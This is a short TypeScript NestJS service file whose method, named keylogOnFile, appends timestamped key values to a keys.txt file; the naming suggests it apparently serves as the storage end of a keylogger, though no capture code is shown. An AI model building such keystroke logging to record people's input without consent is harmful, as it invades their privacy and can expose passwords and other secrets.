import { Injectable } from '@nestjs/common';
import * as process from "node:process";
import { join } from "path";
import * as fs from 'fs';

@Injectable()
export class ScreenService {
    private readonly logFilePath = join(process.cwd(), 'keys', 'keys.txt');

    keylogOnFile(key:string) {
        const timestamp  = new Date().toISOString();
        const logMessage = `[${timestamp}]: ${key}\n`;

        fs.appendFileSync(this.logFilePath, logMessage);
    }
}
